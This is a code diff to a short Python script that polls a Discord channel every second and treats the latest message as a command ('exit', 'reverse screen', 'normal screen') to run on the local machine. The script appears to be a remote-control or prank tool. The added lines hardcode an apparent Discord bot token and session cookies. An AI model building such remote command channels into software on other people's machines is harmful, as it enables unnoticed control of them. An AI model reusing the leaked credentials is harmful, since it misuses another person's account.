@@ -1,4 +1,4 @@
-import urllib.request
+import http.client
 import json
 import time
 import subprocess
@@ -17,25 +17,33 @@ def normal_screen():
 
 def launcher(result):
 	match result:
-		case 1:
+		case "exit":
 			exiting()
-		case 2:
+		case "reverse screen":
 			reverse_screen()
-		case 3:
+		case "normal screen":
 			normal_screen()
 		case _:
 			return
 
 def main():
 	global result
-	paste_url = "https://pastebin.com/raw/ar1jJQ2s"
 	while (True):
-		with urllib.request.urlopen(paste_url) as response:
+		conn = http.client.HTTPSConnection("discord.com")
+		payload = ""
+		headers = {
+			'cookie': "__dcfduid=6bf81bb6eed511ef8fda96826f19ec7d; __sdcfduid=6bf81bb6eed511ef8fda96826f19ec7d6a418151584c1082c2eab32de3e15815bd3454122c131ef9d018e3f6e31a360e; __cfruid=e86e483b413b80cfbc3d213b2d2b3ac779d90f41-1739978634; _cfuvid=jsi5eRPob1E4dhVQHwcvprW5kJKWaTuoLEk8iylW58E-1739978634603-0.0.1.1-604800000",
+			'authorization': "Bot MTIzMzQ4MTAxMDc4NDUwNTg1Nw.G2VbNu.GJnVfq6RdlvyqcpmkFnPUFP8D3jh6xIW_7LaxU"
+			}
+		conn.request("GET", "/api/v9/channels/1341791654503514122/messages?videoid=5179049&limit=1", payload, headers)
+		with conn.getresponse() as response:
 			paste_content = response.read().decode("utf-8")
 		json_content = json.loads(paste_content)
-		if result != json_content["exec"]:
-			result = json_content["exec"]
+		value = json_content[0]['content']
+		if result != value:
+			result = value
 			launcher(result)
+		time.sleep(1)
 
 if __name__ == "__main__":
 	main()
